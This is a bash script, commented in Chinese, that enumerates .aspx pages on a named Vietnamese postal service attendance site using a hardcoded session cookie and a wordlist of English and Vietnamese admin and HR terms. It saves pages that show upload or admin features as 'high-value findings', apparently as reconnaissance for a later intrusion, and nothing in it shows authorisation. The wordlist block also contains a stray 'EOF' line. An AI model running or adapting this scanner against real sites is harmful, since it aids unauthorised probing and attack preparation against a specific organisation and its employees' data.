#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥 死磕：完整.aspx文件枚举"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 扩展字典（包含越南语常用词）
cat > ultimate_aspx_wordlist.txt << 'ASPXLIST'
admin
login
index
default
home
upload
import
export
download
file
user
users
account
profile
password
reset
forgot
change
config
settings
manage
manager
management
report
reports
dashboard
search
query
view
edit
add
create
delete
remove
update
modify
save
submit
process
action
handler
api
service
ajax
json
xml
data
database
db
backup
restore
log
logs
error
debug
test
demo
sample
nhansu
luong
chamcong
baocao
quanly
thongke
nhanvien
phongban
donvi
chucnang
danhmuc
tailieu
taikhoan
matkhau
cauhinh
hethong
quantri
nguoidung
timkiem
xem
sua
them
xoa
capnhat
luu
xuly
baobieu
ketqua
chitiet
danhsach
EOF
ASPXLIST

# 常见目录
DIRS=(
    ""
    "admin"
    "common"
    "report"
    "user"
    "api"
    "service"
    "data"
    "file"
    "upload"
    "import"
    "export"
    "backup"
    "log"
    "config"
)

echo "[1] 枚举所有目录下的.aspx文件..."
for dir in "${DIRS[@]}"; do
    if [ -z "$dir" ]; then
        path=""
    else
        path="/${dir}"
    fi
    
    echo -e "\n[*] 扫描: /chamcong${path}/*.aspx"
    
    while read filename; do
        url="${BASE}${path}/${filename}.aspx"
        
        resp=$(curl -sk "$url" \
            -H "Cookie: $COOKIE" \
            -w "%{http_code}" \
            -o "/tmp/${filename}_${dir}.html" 2>&1)
        
        code=$(echo "$resp" | tail -1)
        size=$(wc -c < "/tmp/${filename}_${dir}.html" 2>/dev/null || echo 0)
        
        if [ "$code" == "200" ]; then
            # 检查是否是有效页面
            if [ $size -gt 500 ]; then
                echo "  ✅ ${filename}.aspx: $code ($size bytes)"
                
                # 检查关键词
                if grep -qi "upload\|file\|import" "/tmp/${filename}_${dir}.html"; then
                    echo "     🔥 包含文件操作功能!"
                    cp "/tmp/${filename}_${dir}.html" "aspx_upload_${filename}.html"
                fi
                
                if grep -qi "admin\|manage\|config" "/tmp/${filename}_${dir}.html"; then
                    echo "     ⚠️  可能是管理页面"
                    cp "/tmp/${filename}_${dir}.html" "aspx_admin_${filename}.html"
                fi
                
                # 记录
                echo "${path}/${filename}.aspx|$code|$size" >> aspx_found_200.txt
            fi
        elif [ "$code" == "302" ] || [ "$code" == "301" ]; then
            echo "  🔄 ${filename}.aspx: $code (重定向)"
            echo "${path}/${filename}.aspx|$code|redirect" >> aspx_found_redirect.txt
        fi
    done < ultimate_aspx_wordlist.txt
done

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 扫描结果:"
echo "200状态: $(wc -l < aspx_found_200.txt 2>/dev/null || echo 0)"
echo "重定向: $(wc -l < aspx_found_redirect.txt 2>/dev/null || echo 0)"

if [ -f aspx_found_200.txt ]; then
    echo -e "\n✅ 发现的页面:"
    cat aspx_found_200.txt
fi

echo -e "\n🔥 高价值发现:"
ls -lh aspx_upload_*.html aspx_admin_*.html 2>/dev/null
